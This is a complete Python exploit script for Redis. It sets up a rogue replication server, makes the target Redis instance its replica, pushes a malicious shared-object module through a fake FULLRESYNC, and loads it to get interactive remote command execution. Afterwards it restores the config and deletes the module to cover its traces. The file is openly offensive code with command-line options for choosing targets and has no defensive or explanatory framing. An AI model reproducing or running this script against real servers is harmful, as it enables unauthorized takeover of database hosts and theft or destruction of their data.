#!/usr/bin/env python3
import socket
import sys
from time import sleep
from optparse import OptionParser

payload = open("exp.so", "rb").read()
CLRF = "\r\n"

def mk_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd

def mk_cmd(raw_cmd):
    return mk_cmd_arr(raw_cmd.split(" "))

def din(sock, cnt):
    msg = sock.recv(cnt)
    if len(msg) < 300:
        print("\033[1;34;40m[->]\033[0m {}".format(msg))
    else:
        print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
    return msg.decode()

def dout(sock, msg):
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)
    if len(msg) < 300:
        print("\033[1;32;40m[<-]\033[0m {}".format(msg))
    else:
        print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))

def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])

class Remote:
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.connect((self._host, self._port))

    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(mk_cmd(cmd))
        buf = self.recv()
        return buf

    def shell_cmd(self, cmd):
        self.send(mk_cmd_arr(['system.exec', "{}".format(cmd)]))
        buf = self.recv()
        return buf

class RogueServerConst:
    class PHASE:
        READY = 0
        PING = 10
        AUTH = 20
        REPLCONF = 30
        SYNC = 100
class RogueServer:
    def __init__(self, lhost, lport):
        self._host = lhost
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.bind((self._host, self._port))
        self._sock.listen(10)

    def handle(self, data):
        resp = ""
        phase = RogueServerConst.PHASE.READY
        if "PING" in data:
            resp = "+PONG" + CLRF
            phase = RogueServerConst.PHASE.PING
        elif "AUTH" in data:
            resp = "+OK" + CLRF
            phase = RogueServerConst.PHASE.AUTH
        elif "REPLCONF" in data:
            resp = "+OK" + CLRF
            phase = RogueServerConst.PHASE.REPLCONF
        elif "PSYNC" in data or "SYNC" in data:
            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
            # send incorrect length
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode()
            resp += payload + CLRF.encode()
            phase = RogueServerConst.PHASE.SYNC
        return resp, phase

    def exp(self):
        cli, addr = self._sock.accept()
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            resp, phase = self.handle(data)
            dout(cli, resp)
            if phase == RogueServerConst.PHASE.SYNC:
                break

def interact(remote):
    try:
        while True:
            cmd = input("\033[1;32;40m[<<]\033[0m ").strip()
            if cmd == "exit":
                return
            r = remote.shell_cmd(cmd)
            for l in decode_shell_result(r).split("\n"):
                if l:
                    print("\033[1;34;40m[>>]\033[0m " + l)
    except KeyboardInterrupt:
        return

def runserver(rhost, rport, passwd, lhost, lport, bind_addr, server_only):
    if server_only:
        rogue = RogueServer(bind_addr, lport)
        print('Use the following commands to attack redis server:')
        print('>>> SLAVEOF rogue-server-ip rogue-server-port')
        print('>>> CONFIG GET dbfilename')
        print('>>> CONFIG GET dir')
        print('>>> CONFIG SET /path/to/expdbfile')
        print('Waiting for connection...')
        rogue.exp()
        print('Payload sent.\nRun "MODULE LOAD /path/to/expdbfile" on target redis server to enable the plugin.')
        return

    # expolit
    remote = Remote(rhost, rport)

    # auth 
    if passwd:
        remote.do("AUTH {}".format(passwd))
    
    # slave of
    remote.do("SLAVEOF {} {}".format(lhost, lport))

    # read original config
    dbfilename = remote.do("CONFIG GET dbfilename").split(CLRF)[-2]
    dbdir = remote.do("CONFIG GET dir").split(CLRF)[-2]

    # modified to eval config
    eval_module = "exp.so"
    eval_dbpath = "{}/{}".format(dbdir, eval_module)
    remote.do("CONFIG SET dbfilename {}".format(eval_module))

    # rend .so to victim
    sleep(2)
    rogue = RogueServer(bind_addr, lport)
    rogue.exp()
    sleep(2)

    # load .so
    remote.do("MODULE LOAD {}".format(eval_dbpath))
    remote.do("SLAVEOF NO ONE")

    # Operations here
    interact(remote)

    # clean up
    # restore original config, delete eval .so
    remote.do("CONFIG SET dbfilename {}".format(dbfilename))
    remote.shell_cmd("rm {}".format(eval_dbpath))
    remote.do("MODULE UNLOAD system")

if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("--rhost", dest="rh", type="string",
            help="target host")
    parser.add_option("--rport", dest="rp", type="int",
            help="target redis port, default 6379", default=6379)
    parser.add_option("--passwd", dest="rpasswd", type="string",
            help="target redis password")
    parser.add_option("--lhost", dest="lh", type="string",
            help="rogue server ip")
    parser.add_option("--lport", dest="lp", type="int",
            help="rogue server listen port, default 21000", default=21000)
    parser.add_option("--bind", dest="bind_addr", type="string", default="0.0.0.0",
            help="rogue server bind ip, default 0.0.0.0")
    parser.add_option("--server-only", dest="server_only", action="store_true", default=False,
            help="start rogue server only, no attack, default false")

    (options, args) = parser.parse_args()
    if not options.server_only and (not options.rh or not options.lh):
        parser.error("Invalid arguments")
        print("TARGET {}:{}".format(options.rh, options.rp))
        print("SERVER {}:{}".format(options.lh, options.lp))
    print("BINDING {}:{}".format(options.bind_addr, options.lp))
    runserver(options.rh, options.rp, options.rpasswd, options.lh, options.lp, options.bind_addr, options.server_only)
